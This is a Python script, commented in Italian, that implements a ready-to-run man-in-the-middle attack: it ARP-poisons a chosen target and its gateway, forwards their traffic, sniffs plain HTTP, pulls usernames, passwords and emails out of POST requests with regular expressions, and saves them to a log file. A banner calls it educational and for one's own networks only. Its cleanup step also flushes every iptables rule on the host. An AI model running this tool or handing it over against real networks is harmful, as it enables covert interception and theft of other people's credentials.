#!/usr/bin/env python3
"""
Advanced MITM ARP Spoofer con HTTP Interception
Autore: Alessandro
Data: 19 Luglio 2025
Scopo: Dimostrativo per lab di sicurezza
"""

import scapy.all as scapy
from scapy.layers.http import HTTPRequest, HTTPResponse
import time
import sys
import os
import threading
import re
from datetime import datetime

class MITMSpoofer:
    def __init__(self, target_ip, gateway_ip, interface="wlo1"):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.spoofing = False
        self.packet_count = 0
        self.intercepted_data = []
        
    def enable_ip_forwarding(self):
        """Abilita IP forwarding per permettere il traffico MITM"""
        print("[+] Abilitando IP forwarding...")
        os.system("echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
        
    def disable_ip_forwarding(self):
        """Disabilita IP forwarding"""
        print("[+] Disabilitando IP forwarding...")
        os.system("echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
        
    def setup_iptables(self):
        """Configura iptables per il forwarding"""
        print("[+] Configurando iptables...")
        os.system(f"sudo iptables -t nat -A POSTROUTING -o {self.interface} -j MASQUERADE")
        os.system(f"sudo iptables -A FORWARD -i {self.interface} -j ACCEPT")
        
    def clear_iptables(self):
        """Pulisce le regole iptables"""
        print("[+] Pulendo regole iptables...")
        os.system("sudo iptables --flush")
        os.system("sudo iptables -t nat --flush")
        
    def fetch_mac(self, addr):
        """Ottiene il MAC address di un IP"""
        print(f"[+] Risolvendo MAC address per {addr}...")
        req = scapy.ARP(pdst=addr)
        bcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        ans, _ = scapy.srp(bcast/req, timeout=3, verbose=False)
        
        if ans:
            mac = ans[0][1].hwsrc
            print(f"[+] MAC di {addr} è {mac}")
            return mac
        else:
            print(f"[-] Nessuna risposta da {addr}")
            return None
            
    def poison_arp(self, victim, impostor, victim_mac):
        """Invia pacchetto ARP spoofato"""
        pkt = scapy.Ether(dst=victim_mac)/scapy.ARP(
            op=2, pdst=victim, hwdst=victim_mac, psrc=impostor)
        scapy.sendp(pkt, verbose=False, iface=self.interface)
        
    def fix_arp(self, victim, impostor):
        """Ripristina ARP table corretta"""
        victim_mac = self.fetch_mac(victim)
        impostor_mac = self.fetch_mac(impostor)
        
        if victim_mac and impostor_mac:
            pkt = scapy.Ether(dst=victim_mac)/scapy.ARP(
                op=2, pdst=victim, hwdst=victim_mac, 
                psrc=impostor, hwsrc=impostor_mac)
            scapy.sendp(pkt, count=4, verbose=False, iface=self.interface)
            print(f"[+] ARP ripristinato per {victim}")
            
    def extract_credentials(self, packet):
        """Estrae credenziali da pacchetti HTTP POST"""
        if packet.haslayer(scapy.Raw):
            payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
            
            # Pattern per credenziali comuni
            patterns = {
                'username': r'(?i)(username|user|login|email)=([^&\s]+)',
                'password': r'(?i)(password|pass|pwd)=([^&\s]+)',
                'email': r'(?i)(email|e-mail)=([^&\s]+)'
            }
            
            found_creds = {}
            for cred_type, pattern in patterns.items():
                matches = re.findall(pattern, payload)
                if matches:
                    found_creds[cred_type] = [match[1] for match in matches]
            
            return found_creds, payload
        return {}, ""
        
    def process_http_packet(self, packet):
        """Processa pacchetti HTTP intercettati"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        # Controlla se è traffico dal/verso il target
        if packet.haslayer(scapy.IP):
            src_ip = packet[scapy.IP].src
            dst_ip = packet[scapy.IP].dst
            
            # Solo traffico del target
            if src_ip != self.target_ip and dst_ip != self.target_ip:
                return
                
            # Pacchetti HTTP Request
            if packet.haslayer(HTTPRequest):
                http_layer = packet[HTTPRequest]
                method = http_layer.Method.decode('utf-8')
                host = http_layer.Host.decode('utf-8') if http_layer.Host else "Unknown"
                path = http_layer.Path.decode('utf-8') if http_layer.Path else "/"
                
                print(f"\n🌐 [{timestamp}] HTTP {method} Request")
                print(f"    From: {src_ip} → To: {dst_ip}")
                print(f"    URL: http://{host}{path}")
                
                # Se è una POST, cerca credenziali
                if method == "POST":
                    creds, payload = self.extract_credentials(packet)
                    if creds:
                        print(f"🚨 CREDENZIALI INTERCETTATE:")
                        for cred_type, values in creds.items():
                            print(f"    {cred_type}: {values}")
                        
                        # Salva nel log
                        self.intercepted_data.append({
                            'timestamp': timestamp,
                            'source': src_ip,
                            'destination': dst_ip,
                            'url': f"http://{host}{path}",
                            'credentials': creds,
                            'method': method
                        })
                    
                    # Mostra primi 200 caratteri del payload POST
                    if len(payload) > 0:
                        print(f"    POST Data: {payload[:200]}{'...' if len(payload) > 200 else ''}")
                        
            # Pacchetti HTTP Response
            elif packet.haslayer(HTTPResponse):
                http_layer = packet[HTTPResponse]
                status_code = http_layer.Status_Code.decode('utf-8') if http_layer.Status_Code else "Unknown"
                
                print(f"\n📡 [{timestamp}] HTTP Response")
                print(f"    From: {src_ip} → To: {dst_ip}")
                print(f"    Status: {status_code}")
                
    def start_packet_capture(self):
        """Avvia cattura pacchetti HTTP in thread separato"""
        print("[+] Avviando cattura pacchetti HTTP...")
        
        # Filter per catturare solo traffico HTTP del target
        filter_str = f"tcp port 80 and host {self.target_ip}"
        
        # Avvia sniffing in thread separato
        sniff_thread = threading.Thread(
            target=scapy.sniff,
            kwargs={
                'iface': self.interface,
                'filter': filter_str,
                'prn': self.process_http_packet,
                'store': 0  # Non salvare in memoria
            }
        )
        sniff_thread.daemon = True
        sniff_thread.start()
        
    def start_spoofing(self):
        """Avvia ARP spoofing"""
        # Ottieni MAC addresses
        target_mac = self.fetch_mac(self.target_ip)
        gateway_mac = self.fetch_mac(self.gateway_ip)
        
        if not target_mac or not gateway_mac:
            print("[-] Impossibile ottenere MAC addresses. Uscita.")
            return False
            
        # Setup networking
        self.enable_ip_forwarding()
        self.setup_iptables()
        
        # Avvia packet capture
        self.start_packet_capture()
        
        print(f"\n🎯 Iniziando MITM attack:")
        print(f"    Target: {self.target_ip} ({target_mac})")
        print(f"    Gateway: {self.gateway_ip} ({gateway_mac})")
        print(f"    Interface: {self.interface}")
        print("\n📡 ARP spoofing attivo (modalità silenziosa)")
        print("🕵️  Monitorando traffico HTTP...")
        print("⚡ Premere Ctrl+C per fermare\n")
        
        self.spoofing = True
        
        try:
            while self.spoofing:
                # Spoof target: "Io sono il gateway"
                self.poison_arp(self.target_ip, self.gateway_ip, target_mac)
                
                # Spoof gateway: "Io sono il target"  
                self.poison_arp(self.gateway_ip, self.target_ip, gateway_mac)
                
                self.packet_count += 2
                
                # Aggiorna contatore ogni 10 pacchetti (ogni 20 secondi)
                if self.packet_count % 10 == 0:
                    print(f"📊 Pacchetti ARP inviati: {self.packet_count} | "
                          f"Dati intercettati: {len(self.intercepted_data)}")
                
                time.sleep(2)
                
        except KeyboardInterrupt:
            print("\n🛑 Ricevuto segnale di stop...")
            self.stop_spoofing(target_mac, gateway_mac)
            
    def stop_spoofing(self, target_mac=None, gateway_mac=None):
        """Ferma spoofing e ripristina sistema"""
        self.spoofing = False
        
        print("\n🔧 Ripristinando sistema...")
        
        # Ripristina ARP tables
        self.fix_arp(self.target_ip, self.gateway_ip)
        self.fix_arp(self.gateway_ip, self.target_ip)
        
        # Ripristina networking
        self.disable_ip_forwarding()
        self.clear_iptables()
        
        # Mostra statistiche finali
        print(f"\n📊 Statistiche Finali:")
        print(f"    Pacchetti ARP inviati: {self.packet_count}")
        print(f"    Dati HTTP intercettati: {len(self.intercepted_data)}")
        
        # Salva dati intercettati
        if self.intercepted_data:
            log_file = f"/tmp/mitm_log_{int(time.time())}.txt"
            with open(log_file, 'w') as f:
                f.write("=== MITM Attack Log ===\n")
                f.write(f"Target: {self.target_ip}\n")
                f.write(f"Gateway: {self.gateway_ip}\n")
                f.write(f"Timestamp: {datetime.now()}\n\n")
                
                for data in self.intercepted_data:
                    f.write(f"[{data['timestamp']}] {data['method']} {data['url']}\n")
                    f.write(f"From: {data['source']} → To: {data['destination']}\n")
                    if data['credentials']:
                        f.write(f"Credentials: {data['credentials']}\n")
                    f.write("-" * 50 + "\n")
                    
            print(f"💾 Log salvato in: {log_file}")
        
        print("✅ Cleanup completato!")

def main():
    print("🎯 Advanced MITM ARP Spoofer v2.0")
    print("=================================")
    print("⚠️  Solo per scopi educativi e test di sicurezza")
    print("⚠️  Usa solo su reti di tua proprietà\n")
    
    if len(sys.argv) not in [3, 4]:
        print("Uso: sudo python3 mitm_spoofer.py <target_ip> <gateway_ip> [interface]")
        print("Esempio: sudo python3 mitm_spoofer.py 192.168.1.100 192.168.1.1 wlan0")
        sys.exit(1)
        
    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]
    interface = sys.argv[3] if len(sys.argv) == 4 else "wlo1"
    
    # Verifica privilegi root
    if os.geteuid() != 0:
        print("❌ Questo script richiede privilegi root (sudo)")
        sys.exit(1)
    
    spoofer = MITMSpoofer(target_ip, gateway_ip, interface)
    spoofer.start_spoofing()

if __name__ == "__main__":
    main()